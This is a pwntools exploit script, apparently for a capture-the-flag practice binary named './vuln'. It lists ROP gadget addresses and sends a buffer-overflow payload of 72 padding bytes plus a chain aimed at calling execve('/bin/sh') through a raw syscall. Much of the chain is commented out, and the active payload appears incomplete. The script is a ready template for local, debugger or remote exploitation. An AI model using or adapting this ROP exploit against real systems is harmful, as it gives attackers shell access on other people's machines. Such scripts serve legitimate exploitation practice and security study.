# 0x000000000047f613 : mov qword ptr [rdi], rdx ; ret
# 0x000000000048ba81 : pop rdi ; ret
# 0x000000000048e3ed : pop rsi ; ret
# 0x0000000000490cf2 : pop rdx ; ret
# 0x0000000000427f94 : pop rax ; ret
# 0x00000000004011a3 : syscall

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
b *0x000000000040184f 
continue
'''.format(**locals())


# Binary filename
exe = './vuln' #change this
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

write_addr = 0x4c6000
write_gadget = 0x000000000047f613
pop_rdi = 0x000000000048ba81
pop_rsi = 0x000000000048e3ed
pop_rdx = 0x0000000000490cf2
pop_rax = 0x0000000000427f94
syscall = 0x00000000004011a3


payload = flat(
	b'A' * 72,
	pop_rdx,
	b'B' * 8,
	b'/bin/sh',
	# pop_rdi,
	# write_addr,
	# write_gadget,
	# pop_rax,
	# 0x3b,
	# pop_rdi,
	# write_addr,
	# pop_rsi,
	# 0x0,
	# pop_rdx,
	# 0x0,
	# syscall
	)

# log.info(hex(int(p64(pop_rdx),16)))

# payload = flat(
# 	b'A' * 72,
# 	b'B' * 8,
# 	b'C' * 112
# 	)
io.sendline(payload)

io.interactive()